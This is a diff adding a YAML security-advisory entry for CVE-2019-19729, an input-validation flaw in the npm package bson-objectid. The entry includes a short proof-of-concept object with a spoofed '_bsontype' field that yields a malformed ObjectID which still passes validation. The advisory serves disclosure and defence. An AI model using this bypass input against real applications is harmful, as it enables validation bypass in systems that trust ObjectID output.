@@ -1,0 +1,30 @@
+---
+- id: snykio:npm:bson-objectid:570765
+  title: Insufficient Input Validation
+  description: "[bson-objectid](None) is a library that allows you to construct\nObjectIDs
+    without the mongodb driver or bson module.\n\nAffected versions of this package
+    are vulnerable to Insufficient Input\nValidation. The `ObjectID()` function allows
+    an attacker to generate a\nmalformed `objectid` by inserting an additional property
+    to the\nuser-input, because bson-objectid will return early if it detects\n`_bsontype==ObjectID`
+    in the user-input object. As a result, objects in\narbitrary forms can bypass
+    formatting if they have a valid bsontype.\n\n### PoC by Feng Xiao (xiaofen9)   {#poc-by-feng-xiao-xiaofen9}\n\n
+    \   var ObjectID = require(\"bson-objectid\");\n    \n    var json = {\n        \"mal_formkey\":
+    {\n            \"payload\": \"xxxx\"\n        },\n        \"_bsontype\" : \"ObjectID\"\n
+    \   };\n    \n    console.log(ObjectID(json));\n    console.log(ObjectID.isValid(ObjectID(json)));\n\n"
+  affected_package: bson-objectid
+  vulnerable_versions:
+  - "*"
+  severity: low
+  package_manager: npm
+  cve:
+  - CVE-2019-19729
+  cwe:
+  - CWE-284
+  disclosed_date: 2019-11-12
+  created_date: 2020-06-01
+  last_modified_date: 2020-06-01
+  credit:
+  - Feng Xiao (xiaofen9)
+  references:
+  - https://github.com/williamkapke/bson-objectid/issues/30
+  source_url: https://snyk.io/vuln/SNYK-JS-BSONOBJECTID-570765
